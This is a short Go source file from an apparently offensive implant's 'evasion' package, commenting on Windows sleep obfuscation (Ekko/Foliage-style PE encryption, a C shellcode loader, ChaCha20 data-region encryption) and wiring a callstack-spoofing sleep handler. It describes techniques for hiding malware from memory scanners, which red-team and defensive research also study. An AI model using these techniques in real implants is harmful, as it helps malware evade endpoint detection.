package evasion

/*
	Windows Sleep Obfuscation

	Full PE image encryption during sleep (Ekko/Foliage style) is NOT
	implemented here. Those techniques require:
	1. A timer-queue ROP chain that executes from kernel callbacks
	2. Complete control over all executing threads
	3. No concurrent runtime (GC, goroutines, network poller)

	Go's runtime cannot be frozen from userland — goroutines managed
	by the Go scheduler continue executing even when the main thread
	sleeps. Encrypting the .text section would crash those goroutines.

	For full PE encryption, use a C shellcode loader that manages the
	sleep cycle externally (encrypt payload region, sleep, decrypt,
	resume). See loader/loader.c.

	This file sets the Windows sleep handler to use the cross-platform
	ChaCha20 data-region encryption from sleep_obfuscate.go, which
	protects session keys and sensitive buffers without touching code
	sections.
*/

func init() {
	SleepWithCallstackSpoof = ObfuscatedSleep
}
